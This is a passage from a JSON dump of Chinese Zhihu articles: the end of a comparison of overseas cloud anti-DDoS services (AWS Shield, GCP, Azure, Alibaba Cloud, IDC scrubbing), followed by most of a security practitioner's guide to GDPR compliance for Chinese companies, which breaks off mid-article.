class=\"ztext-empty-paragraph\"><br/></p><ul><li>接入负载均衡集群</li><ul><li>使用公有云的ELB</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>业务架构设计支持高可用和灵活迁移</h2><p>在攻击规模超过线上系统承受范围时，业务系统架构很大程度影响了所能采取的应对措施。比如使用LB+域名的方式，则接入云清洗会非常方便。如果采用的RS+IP的方式，则还要另外更换RS IP，甚至修改客户端获取的服务器列表等内容，导致整体调整成本过高，从而影响清洗效果。</p><h2>公有云</h2><p>国外公有云主要是Amazon Web Service(AWS)、Google Cloud Platform(GCP)以及Microsoft Azure(Azure)，也可以考虑阿里云、腾讯云、金山云、Ucloud等国内公有云的海外节点。</p><h2>对比分析表</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-721382edf4b5680b256fbd85535ee642_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1076\" data-rawheight=\"920\" class=\"origin_image zh-lightbox-thumb\" width=\"1076\" data-original=\"https://pic3.zhimg.com/v2-721382edf4b5680b256fbd85535ee642_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1076&#39; height=&#39;920&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1076\" data-rawheight=\"920\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1076\" data-original=\"https://pic3.zhimg.com/v2-721382edf4b5680b256fbd85535ee642_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-721382edf4b5680b256fbd85535ee642_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><a href=\"https://zhuanlan.zhihu.com/p/43422797/(http://docs.aws.amazon.com/waf/latest/developerguide/ddos-overview.html#ddos-help-me-choose)\" class=\"internal\">AWS Shield</a></h2><p>aws专门用于DDoS防护的产品，可为ELB、CloudFront以及 Amazon Route53提供扩展的 DDoS 攻击保护。<a href=\"https://link.zhihu.com/?target=https%3A//s3.cn-north-1.amazonaws.com.cn/sides-share/%25E4%25BA%2591%25E6%25B8%25B8%25E4%25B8%2596%25E7%2595%258C%25EF%25BC%259A%25E6%25B8%25B8%25E6%2588%258F%25E8%25A1%258C%25E4%25B8%259ADDOS%25E5%259C%25A8AWS%25E4%25B8%258A%25E7%259A%2584%25E8%25A7%25A3%25E5%2586%25B3%25E6%2596%25B9%25E6%25A1%2588.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">aws ddos防护整体流程图如下：</a></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-61af8446b94e0cd4f518c1b1a372422d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"877\" data-rawheight=\"409\" class=\"origin_image zh-lightbox-thumb\" width=\"877\" data-original=\"https://pic2.zhimg.com/v2-61af8446b94e0cd4f518c1b1a372422d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;877&#39; height=&#39;409&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"877\" data-rawheight=\"409\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"877\" data-original=\"https://pic2.zhimg.com/v2-61af8446b94e0cd4f518c1b1a372422d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-61af8446b94e0cd4f518c1b1a372422d_b.jpg\"/></figure><p>分为标准版和高级版，对比图如下：</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-27b849f080a2e65a7e6586397da19278_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1366\" data-rawheight=\"1705\" class=\"origin_image zh-lightbox-thumb\" width=\"1366\" data-original=\"https://pic1.zhimg.com/v2-27b849f080a2e65a7e6586397da19278_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1366&#39; height=&#39;1705&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1366\" data-rawheight=\"1705\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1366\" data-original=\"https://pic1.zhimg.com/v2-27b849f080a2e65a7e6586397da19278_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-27b849f080a2e65a7e6586397da19278_b.jpg\"/></figure><ul><li>标准版</li><ul><li>3/4层保护</li><ul><li>自动检测与防御</li><li>提供常见DDoS攻击防护：SYN/UDP Floods,反射攻击等</li><li>aws内置服务，免费</li></ul></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><ul><li>7层保护</li><ul><li>AWS WAF为7层攻击提供防护</li><li>aws官方服务，需要收费</li></ul></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>高级版</li><ul><li>功能</li><ul><li>持续监控和检测（含3/4/7层）</li><li>提供常见DDoS攻击防护以及额外的防护手段</li><li>提供实时报警与历史数据查询（含3/4/7层）：可看到哪些 IP、ASN 或国家/地区是攻击流量的主要来源。</li><li>AWS DDoS应急响应团队（DRT）服务：使用 DRT可为自定义 DDoS 和WAF 防护策略，或者寻求 DRT 帮助。</li><li>为受攻击的Route 53, CloudFront, and ELB提供费用减免</li><li>应用在ELB/CloudFront</li><li>包含WAF在内的安全防护费用，为$3000/月，数据传输费用另算</li></ul></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><ul><li>支持的区域：弗吉尼亚北部、俄勒冈、爱尔兰、东京和加利福尼亚北部</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>其他说明</li><ul><li>响应时间： cloudfront提供秒级、elb提供分钟级、shield提供分钟级、触发阈值：入向5Gbps。可以看到aws ec2的响应时间比较慢，而且触发清洗阈值很高，如果真被这么打，业务会有一段时间受影响，无法做到实时的防护。</li><li>免费服务天花板： 原则上是用尽带宽</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2><a href=\"https://link.zhihu.com/?target=https%3A//cloud.google.com/files/GCPDDoSprotection-04122016.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Google Cloud Platform</a></h2><p>总体来说，gcp提供的产品线比aws简单，好处是gcp在台湾有节点，而aws没有，所以对于在台湾发行的海外业务可以考虑接gcp。下面介绍gcp在ddos防护上的服务。</p><ul><li>gcp官方ddos防护服务叫<a href=\"https://link.zhihu.com/?target=https%3A//cloud.google.com/armor/%3Futm_source%3Dgoogle%26utm_medium%3Dcpc%26utm_campaign%3Djapac-SG-all-en-dr-bkws-all-all-trial-e-dr-1003987%26utm_content%3Dtext-ad-none-none-DEV_c-CRE_284296697661-ADGP_Hybrid%2B%257C%2BAW%2BSEM%2B%257C%2BBKWS%2B~%2BT3%2B%257C%2BEXA%2B%257C%2BIAS%2B%257C%2BM%253A1%2B%257C%2BSG%2B%257C%2Ben%2B%257C%2Barmor-KWID_43700035199602760-kwd-475861323040%26userloc_2702%26utm_term%3DKW_google%2520cloud%2520armor%26gclid%3DCj0KCQjwn4ncBRCaARIsAFD5-gWO2sAe7cXFa-DK2NLxV0T83RHTfu-Lkde6Cvg2s_1eeZ7F5N5m1koaAsF8EALw_wcB%26dclid%3DCK_Lu6Kgit0CFQ1LKwodjksNBA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Armor</a>，2018年才推出的，但目前只面向web服务。</li><li>ddos防护这块属于gcp的基础架构安全，有<a href=\"https://link.zhihu.com/?target=https%3A//console.cloud.google.com/launcher/details/cloudflare-saas/cloudflare%3Fpli%3D1\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">cloudflare</a>、<a href=\"https://link.zhihu.com/?target=https%3A//console.cloud.google.com/launcher/details/reblaze-public/reblaze-saas%3F_ga%3D2.35229217.1647006864.1512636660-2146296341.1512636660\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">reblaze</a>和<a href=\"https://link.zhihu.com/?target=https%3A//www.incapsula.com/ddos-protection-for-google-cloud.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Imperva </a>三家合作伙伴，需要到对应官网注册接入，接入原理也是基于反代或dns解析</li></ul><h2>Azure</h2><p>Azure官方提供DDoS防护服务，包括基础版和标准版两种。对比一下：</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-e5c1058314e673117da229aa97a649ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"397\" class=\"origin_image zh-lightbox-thumb\" width=\"1070\" data-original=\"https://pic4.zhimg.com/v2-e5c1058314e673117da229aa97a649ab_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1070&#39; height=&#39;397&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"397\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1070\" data-original=\"https://pic4.zhimg.com/v2-e5c1058314e673117da229aa97a649ab_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-e5c1058314e673117da229aa97a649ab_b.jpg\"/></figure><h2>阿里云</h2><p>阿里云产品线非常丰富，光DDoS防护就有阿里云盾-BGP高防和阿里云盾-游戏盾两种产品，均提供四层/7层CC防护策、攻击流量图、原始/攻击日志、业务可用性监控等服务。</p><ul><li>BGP高防</li><ul><li>20G以内线路质量不错，但是大流量攻击需要结合静态高防，线路质量下降。攻击流量超过600G阿里BGP高防会强制黑洞。</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>游戏盾</li><ul><li>抗D四层防护用户体验非常好，同时可以节省云厂商的带宽投入，动态调度节点。</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>IDC高防或者清洗</h2><p>可以选择合作方提供的IDC高防或清洗服务，也可以接入国内CDN厂商的海外节点，比如UCloud。IDC高防或清洗，其多面向自己的用户，实现原理上不同于域名解析或者反代，而是将自己用户流量牵引到清洗设备或者直接在高防设备（通常也是IDC出口）上进行防护。因此：</p><ul><li>选择IDC机房时需要考虑其是否有DDoS防御能力和对应服务</li></ul><h2>处理流程</h2><h2>接入</h2><h2>根据业务部署情况、成本选择接入公有云或者本地IDC高防或者清洗</h2><ul><li>尽可能接入自己的ISP高防或清洗服务，因为内网互通，避免使用反代或者域名解析时暴露真实ip</li><li>可以先使用公有云主机，同时根据地理位置就近购买专业高防或清洗服务备用，在云主机扛不住的时候迁走流量。或者在新服上线或者搞活动等业务高峰前购买备用。</li></ul><h2>关于具体的接入方式，则需要根据选择的方案具体确认</h2><p>比如使用云清洗的方式，则可采用DNS解析或者反代的方式。如果选择IDC清洗的方式，一般是IDC层面把网络配置和清洗设备上线后，在清洗设备端操作即可，用户无感知。</p><h2>防护策略</h2><h2>检测与报警</h2><p>接入监控，设置流量bps/pps报警阈值</p><h2>清洗触发阈值</h2><p>清洗触发阈值一般设置正常流量峰值的2-3倍即可，由于有些清洗算法会随机丢包，因此为了避免无攻击时被清洗，需提高触发阈值。</p><h2>清洗算法选择</h2><p>目前业界清洗算法大同小异，常见的清洗算法主要有：畸形包丢弃；报文特征匹配；先跟清洗设备建立tcp连接，被识别为正常连接后加入白名单；黑名单；限流等等。具体算法的选择需要根据业务协议、流量变化趋势等特征进行选择。</p><p>文章先以两家中国企业海外抗D的实践为模板，引出使用公有云和IDC两种提供商的抗D服务，希望能给有需要的企业一个参考。此外，在此声明，作者与文中涉及的企业利益无关，仅从客观调研的角度进行探讨，其中如有说的不对的地方，请读者指出，定认真听取指教。</p><h2>参考资料</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000015490043\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">2018上半年游戏行业DDoS态势报告</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.incapsula.com/ddos-protection-for-microsoft-azure.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Azure海外抗DDoS服务</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//cloud.google.com/files/GCPDDoSprotection-04122016.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GCP海外抗DDoS服务</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.aliyun.com/product/ddos%3Fspm%3D5176.8101214.369306.281.7d7d9fcbr3NIPe\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">阿里云海外抗DDoS服务</a></p><p><a href=\"https://link.zhihu.com/?target=http%3A//docs.aws.amazon.com/waf/latest/developerguide/ddos-overview.html%23ddos-help-me-choose%2529\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">AWS海外抗DDoS服务</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.ucloud.cn/site/product/uads.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">UCloud海外抗DDoS服务</a></p>", 
            "topic": [
                {
                    "tag": "DDoS", 
                    "tagLink": "https://api.zhihu.com/topics/19591790"
                }, 
                {
                    "tag": "公有云", 
                    "tagLink": "https://api.zhihu.com/topics/19912213"
                }, 
                {
                    "tag": "海外", 
                    "tagLink": "https://api.zhihu.com/topics/19632841"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43422560", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 1, 
            "title": "当GDPR来敲门", 
            "content": "<p>距离欧盟《通用数据保护条例》（General Data Protection Regulation，GDPR）正式生效的日子不远了。据称，该条例将在2018年5月25日正式生效。在法律行业针对该条例的讨论如火如荼，但安全圈却少有发声，另外，法律行业提供的意见也过于理论，不太具有操作性。本文试图从安全从业者的角度解读GDPR，同时为中国互联网企业出海合理应对GDPR提供一些可操作的措施。另外，“GDPR中国版”--《个人信息安全规范》也于2018年5月1日正式生效，本文将会分析该规范与GDPR的异同，以及面对这两个版本的“GDPR”，中国互联网企业如何将其安全合规需求与企业安全建设结合在一起。</p><h2>GDPR有什么特别</h2><p>众所周知，欧洲对个人信息安全保护重视程度比美国更甚。1995年欧盟即发布了《数据保护指令》（Data Protect Demand，DPD），到了2016年4月，更是通过了“史上最严个人信息保护法案”--GDPR用于取代DPD。该条例完全更新了欧盟成员国以及任何与欧盟各国进行交易或持有欧盟公民数据的公司必须安全存储和管理个人数据的方式。目前该条例在28个欧盟成员国统一实施生效，这将使28个欧盟及欧洲经共体成员国的隐私保护法更具有一致性和现代性。但是，GDPR的合规要求是相当高的，需要大多数企业投入大量的人力、财力才能得以实现。</p><p>下面从GDPR与DPD相比的特别之处来理解GDPR。</p><h2>GDPR扩展了保护对象</h2><p>首先，GDPR虽然是一个法律问题，但是与隐私安全保护息息相关。GDPR以个人可识别信息（Personally dentifiable information, PDI）为核心概念，凡是可以用作识别个人身份的相关信息，均落入GDPR保护范围，这些信息不再只是单纯的姓名、电话或是地址，同时也包括浏览器的Cookie、IP位置，或是足以识别个人身份的生物特征以及医疗资料。比如下面的信息：</p><ul><li>基本的身份信息，如姓名、地址和身份证号码等；</li><li>网络数据，如位置、IP地址、Cookie数据和RFID标签等；</li><li>医疗保健和遗传数据；</li><li>生物识别数据，如指纹、虹膜等；</li><li>种族或民族数据；</li><li>政治观点；</li><li>性取向。</li></ul><h2>GDPR扩大了责任主体范围</h2><p>GDPR的责任主体分为controller：管理者和processor：执行者，只要其数据处理活动与向欧盟境内的数据主体提供商品、服务（无论免费与否）有关，或其数据处理活动涉及到监测欧盟境内数据主体的行为即构成责任主体。 细化一点说，GDPR的适格企业只要具备以下其中1个条件：</p><ul><li>在欧盟境内拥有业务；</li><li>在欧盟境内没有业务，但是存储或处理欧盟公民的个人信息；</li><li>在欧洲境内有办事机构，且超过250名员工；</li><li>在欧洲境内有办事机构，少于250名员工，但是其数据处理方式影响数据主体的权利和隐私，或是包含某些类型的敏感个人数据。</li></ul><h2>GDPR增强了数据主体的权利 GDPR既包含了指令中数据主体已经拥有的权利，还赋予数据主体额外的权利，包括：</h2><ul><li>1.数据可携带权（从数据控制方获得个人信息的副本）</li><li>2.被遗忘权</li><li>3.限制数据处理的权利</li><li>4.反对数字画像和数据自动处理的权利：对于仅仅依据数据自动处理（包括画像）作出的、具有法律效力或可能产生显著影响的决定，数据主体有权要求免于受这样的决定的制约。在很多情形下，个人有权选择从数字画像和数据自动处理中退出。数据控制者面临更强的透明度要求。</li></ul><h2>严格规定了个人同意的条件</h2><p>个人同意仍然作为个人信息收集和使用的前提，但相对于DPD，GDPR对何为有效的个人同意的前提，做出了更加严格的要求。核心的变化是，数据主体做出声明，或者做出清晰的肯定性动作，同意被认为才有效。个人沉默、提前勾选的选项、静止等状态，不足以认定个人表达了同意。GDPR还明确了何种情况下，同意不是由数据主体自由地做出的。数据控制方还应当告知数据主体撤回同意的权利。</p><h2>详细规定了数据处理者责任</h2><p>对数据处理方赋予新的合规要求，是GDPR最重要的变化之一。以下是要点：</p><ul><li>1.数据控制方、数据处理方的定义没有改变</li><li>2.GDPR直接对数据处理方课以义务，而且不履行这些义务时，将会直接问责。</li><li>3.数据处理方的主要义务</li><ul><li>采用合适的技术和组织方面的措施，以保证一定的数据安全水平</li><li>详细记录数据处理活动</li><li>如果数据处理方位于欧盟境外，在某些情形中，数据处理方应在欧盟境内任命一位数据保护官和一位代表</li><li>履行与数据控制方一样的数据跨境流动合规要求</li><li>就数据安全事件，强制通知数据控制方</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>4.如不合规，数据处理方将直接受监督机构的管辖</li><li>5.GDPR适用于位于欧盟境内的数据处理方，或在欧盟境内发生的数据处理活动。还将适用于位于欧盟境外的数据处理方，不过仅限于向欧盟境内居住的个人提供商品或服务的有关数据处理行为，或者与记录欧盟境内居住的个人的行为的有关数据处理行为。</li><li>6.数据控制方和数据处理方应当签署详细的数据处理协议。GDPR详细地规定了协议的条款</li><li>7.数据处理方只有在获得数据控制方的事先同意后，才能使用次一级数据处理方（sub-processors）。次一级数据处理方与上一级数据处理方应当签署数据处理协议，协议中规定的义务，和上一级数据处理方与数据控制方签署的协议的内容相同。</li><li>8.数据处理方在数据控制方允许的范围外，开展的数据处理行为，将被GDPR认定为数据控制方，同时应履行数据控制方相同的责任。</li></ul><h2>数据处理记录文档化</h2><p>数据控制方和数据处理方应保留关于数据处理活动的详细记录，并随时应监督机构的要求提供。</p><h2>通过设计实现隐私保护和通过默认设置实现隐私保护</h2><p>考虑到最新发展、执行的成本、数据处理的性质、范围、情境、目的，以及对自然人权利和自由的不同程度和大小的风险，数据控制者应在一开始决定数据处理方式时，及开始数据处理时，采用合适的技术和组织方面的措施，例如假名化；这些措施的目的在于有效地落实数据保护原则，例如数据最小化原则，及将必需的保护措施整合进数据处理流程中，以满足《条例》提出的要求，并保护数据主体的权利。<br/>数据控制者应采用合适的技术和组织方面的措施，以实现默认的情况下，仅仅处理为实现目的而最少必需的个人数据。此义务适用于收集到的个人数据，数据处理的范围，数据存储周期，以及数据被访问的程度。特别是这些措施应保障在默认情况下，在个人没有作出同意时，个人数据不会被不限定的自然人访问。</p><h2>数据保护影响评估</h2><p>如果处理个人信息可能导致个人权益有较高的风险被侵害时（特别是采用新技术时），数据控制方应当进行数据保护影响评估。 在以下场景中，数据保护影响评估被特别要求：</p><ul><li>自动数据处理包括数字画像，评估对个人的影响</li><li>对特定类别的数据进行大规模处理时</li><li>对开源数据进行系统性监测时</li></ul><h2>问责原则</h2><p>应当保证采取合适的技术和组织方面的措施，以保证合规，同时具备向外界客观地展现合规的能力。</p><h2>数据保护官</h2><p>部分私营部门机构和大多数公共部门机构将被要求任命一名数据保护官，以监督数据处理活动。</p><ul><li>公共部门处理数据的情形</li><li>数据控制方和处理方的核心活动如果包含对数据主体开展常态、系统、大规模的监测时</li><li>数据控制方和处理方的核心活动如果包含对特定类别的数据开展大规模处理时</li><li>成员国法律有所要求时</li></ul><h2>数据跨境流动机制的重构</h2><p>GDPR保留的1995年指令关于数据跨境流动的机制，同时增加了新的制度安排，例如认证机制、行为守则、以及基于正当目的偶尔为之的数据传输时可一定程度上免除相关义务。 除一定例外之外，国别性质的许可被免除。GDPR正式认可了有约束力的公司准则。</p><h2>数据安全事故通知</h2><p>在数据安全事故发生之后，数据控制方应当及时向监督机构报告，在可行时，应当在72小时内，除非数据安全事故不太可能导致数据主体权益受损。 如果未能在72小时内报告，应当提供合理的解释。 如果安全事件对个人权益造成损害的可能性高，则数据控制方应当及时通知受影响的数据主体。</p><h2>执法和处罚</h2><p>GDPR将会统一各成员国监督机构的权力和任务，并大幅增加处罚标准。为重大违规事件，罚款可高达2000万欧元或前一财年全球收入的4%。</p><h2>GDPR对中国企业出海有什么影响</h2><h2>GDPR适用范围</h2><p>只要企业收集欧盟公民的数据，就受到GDPR的管辖。除非你的公司在业务和技术上非常严格地排除了欧盟，否则还是得处理GDPR合规问题。最近10年，中国企业争相出海，从做手机起步的小米重兵布局印度，到猎豹移动通过AWS在欧美移动app时长叱咤风云，可以说，随着对全球对个人信息保护的重视，各种法律、安全合规要求只会越来越多。所以，GDPR是中国企业出海，无法绕过的一道坎，今天绕过了，明天在另一个地方，类似的规定也会接踵而来。</p><h2>带来的挑战</h2><h2>理念的转变</h2><ul><li>从设计和默认上保护数据隐私</li><ul><li>GDPR强调“security by design and by default”，要求从规划设计上应当做到安全，同时要将安全作为默认规则。很显然，放眼全球，即便是Apple、Google，也未必完全达到，更何况对安全和隐私保护相对欠缺的中国企业。</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>学习、接受成本高昂</li><ul><li>因为观念上的转变，以及理解、学习GDPR就需要投入：国内目前的介绍很多只是从英文材料翻译过来而已，为了准确理解GDPR，很多需要找咨询机构或者律所进行解读，这就是成本。而且GDPR缺乏具体实践案例，很多企业注定要花费大量成本进行摸索。</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>技术与流程的转变</h2><p>理解了GDPR后，需要按照GDPR进行梳理或者整改，就涉及到具体落地。</p><ul><li>数据收集时需要明确获得用户同意，涉及用户协议和隐私政策的修改</li><li>不能将原始数据直接传回国内，而是脱敏或者加密后才回传国内，与此同时，测试环境不应当使用线上用户数据</li><li>数据保存的高可用，需要保障用户数据的一致性和可靠性</li><li>加强用户数据的监控与异常事件告警</li><li>权限控制和审计：对于内部访问用户数据行为进行权限控制以及审计，避免出现“内鬼”或者攻击者通过内部用户非法获取用户数据</li><li>应急响应流程和安全演练与评估：企业应当制订相应的用户数据安全事件响应机制并加以评估测试。</li></ul><h2>强调企业内部协作</h2><p>法务、安全、人力、公共关系、产品、市场营销和用户关系部门的通力合作，是GDPR落地的必要条件，任何一个部门的单打独斗，都无法撑起GDPR的合规需求。</p><h2>很大的不确定性</h2><ul><li>GDPR也留下了许多解释空间，使得其执法灵活性很高</li><ul><li>公司必须为个人数据提供“合理”的保护等级，但是却并未明确界定“合理”的标准。如此一来，在涉及评估数据违规和违规罚款的问题时，就为GDPR管理机构留出了很大的解释余地。</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>中国互联网企业如何应对GDPR</h2><h2>认真考虑自身在欧盟管辖区域内运行和开展业务的风险</h2><ul><li>识别并明确记录与处理欧盟数据主体的个人信息相关的一切活动，包括确保每项处理活动皆具有合法目的。</li><li>确保收集个人数据时始终向数据主体发出充分的通知，告知对方其被收集的数据有哪些，并明确说明目前正在处理的数据内容。</li><li>为回应欧盟民众的数据主题访问请求（简称 DSAR）以及其它权利主张做好准备。GDPR 规定各企业需要在30天时限之内回应相关请求。</li></ul><h2>从研究和借鉴的视角提升自身的隐私数据安全保护能力</h2><ul><li>建立一套隐私影响评估流程，对数据保护及个人隐私权影响作出正式分析，并将其引入任何新的业务流程或系统。</li><li>通过充分、得到认同且有约束力的企业规则或其它合同条款以保护被转移至欧盟之外的个人数据。</li><li>审查访问控制、加密、化名与技术安全措施，以保护由企业控制的个人信息。</li><li>在发生危及欧盟公民个人信息的安全事件后的72小时之内，向欧盟数据保护机构发出通报。</li><li>任命一名数据保护官，负责对数据保护工作进行定期及系统性监测，同时负责内部教育、培训以及合规性审计事务。此人还将负责企业与GDPR监管当局之间的沟通，以及与数据主体间的交互。此要求适用于一切拥有高度敏感数据，或处理及/或存储大量欧盟个人数据的组织——无论这些主体是否属于组织外的员工或个人。</li></ul><h2>结合GDPR要求调整或完善自有产品以满足监管和市场要求</h2><ul><li>进行风险评估</li><li>GDPR还要求控制员和处理员指定一个数据保护员(DPO)来监管数据安全策略和GDPR合规性。核心活动涉及处理或存储大量的欧盟公民数据、处理或存储特殊类别的个人数据（健康记录、犯罪记录）的组织必须指定名DPO。DPO主要负责就GDPR规定提供咨询意见，向最高管理层报告。</li><li>改变企业处理、存储和保护用户个人数据的方式。</li><li>公司必须在发现违规事件的72小时内，向监管当局和受到违规事件影响的个人通报数据违规行为。</li><li>制定数据保护计划</li><li>制定一个汇报GDPR合规进度的计划</li><li>实施降低风险的措施</li><li>建立持续的评估流程</li></ul><h2>实践GDPR的方法：落实TOMs</h2><ul><li>Controller和Processor均要落实TOMs：技术和组织措施，主要包括以下几个部分</li><ul><li>保障系统与服务的保密性：这里包括数据访问权限控制，传输加密等</li><li>保障系统与服务的完整性：这里包括数据的安全存储、日志保存以及访问控制</li><li>保障系统与服务的可靠性：这里主要是数据的备份容灾</li><li>安全事件应急响应机制的建立：这里主要是安全事件的应急，需要有明确的处理流程</li><li>对已有流程和技术的评估测试：对于已经建立的技术和流程措施，需要通过演练和安全测试，确认其有效性和执行效率</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>GDPR合规实践</h2><p>由于绝大部分中国出海企业在欧盟并没有办事机构，而是通过上架应用或者代理商的方式开展业务，因此，下面主要讨论只在欧盟发行业务而没有办事机构，或者没有专门欧盟业务，而有欧盟用户的情况下的合规实践。</p><h2>具体应对措施</h2><p>下面根据是否保留欧盟市场分开讨论。</p><h2>保留欧盟市场</h2><ul><li>不在欧洲发行，有少量用户问题不大，不需要采取应对措施，这时触发GDPR的可能性不大。但如果有大量用户，比如总用户数超过10万等，这时就要谨慎应对了。</li></ul><h2>总体思路</h2><ul><li>企业需要表明立场，同时付诸行动：发公告、在技术实现或者流程限制上做出表示。</li><li>修改用户协议与隐私政策</li><ul><li>1.秉承公平公正的原则，应当通知用户，经过授权才能拿；</li><li>2.使用目的应当符合使用场景，而不是以借口a用于b；</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>为用户提供更多管理个人信息的权限</li><ul><li>给用户提供迁移和删除权限以及手段</li><li>安全事件主动通知，确保用户知情权</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>数据处理方式</li><ul><li>如果对外传输的数据经过脱敏（ip hash或者用户标识符 hash等），只要不可逆就是可以的， 也可以在欧盟内分析再传回国内。</li><li>欧盟市场的产品七层流量统一走https</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>执行情况</li><ul><li>具体适用需要看国际法，如果GDPR与中国法律冲突，需要按照国际法去选择</li></ul></ul><p class=\"ztext-empty-paragraph\"><br/></p><h2>退出欧盟市场</h2><ul><li>放弃欧盟市场的采用ip地址库封掉ip即可</li></ul><h2>不应该走捷径或者耍小聪明</h2><ul><li>GDPR内公有云不同region流通数据是否合规需要确认，但DPD是允许的</li><li>同样的，企业私有云或者走内网/vpn跨境传输数据也应当纳入GDPR考虑范围内。</li><li>不走空中传输，先到公有云然后走内网回国内，也在GDPR保护范围内，因为Processor也受监管</li></ul><h2>Processor的选择</h2><p>大部分中国互联网公司出海，业务都承载在公有云之上。此时公有云自然而然就成了GDPR的Data Processor，此外随着大数据分析的需要或者开放平台的需求，企业也会给第三方开放接口，多少会涉及到用户数据，比如微信、新浪微博开放用户昵称、头像等信息。与此同时，互联网应用无法避免应用分发的问题，需要接入其他厂商的sdk，那么用户数据不再是通过企业后端接口获取，而是直接在客户端获取了。所以，对于公有云、第三方厂商、渠道商需要谨慎选择，确保对方也符合GDPR要求才行，严格遵循最小权限原则、有限授权、认证与审计并重、同步监控报警以及准备紧急事件应对方案。</p><ul><li>公有云：目前AWS、GCP、Azure、阿里云都提供了GDPR支持服务，其中AWS是在2017年初已经提供了完备的GDPR用户文档，并宣布自身满足GDPR，相对而言另外几家上线服务较晚，基本都是2017年之后陆续推出的。</li><li>第三方厂商：对于第三方厂商的选择需要注意Facebook的前车之鉴：给剑桥分析提供接口获取数千万用户的政治观点暴露。</li><li>渠道商：外部sdk的接入，使渠道商也能在客户端获取到用户信息。</li></ul><h2>延伸话题</h2><h2>GDPR本地化</h2><p>当前国内立法紧跟国际趋势，在立法效率和立法标准上与欧美不遑多让，我国国家质量监督检验检疫总局和国家标准化管理委员会在2017年12月29日发布，2018年5月1日正式实施的一部关于我国公民个人隐私安全保护重磅技术标准：《信息安全技术 个人信息安全规范》（GB/T 35273—2017）（以下简称《个人信息安全规范》或《规范》），与GDPR不同的是，该标准不是一部强制性标准而是一部推荐性标准。 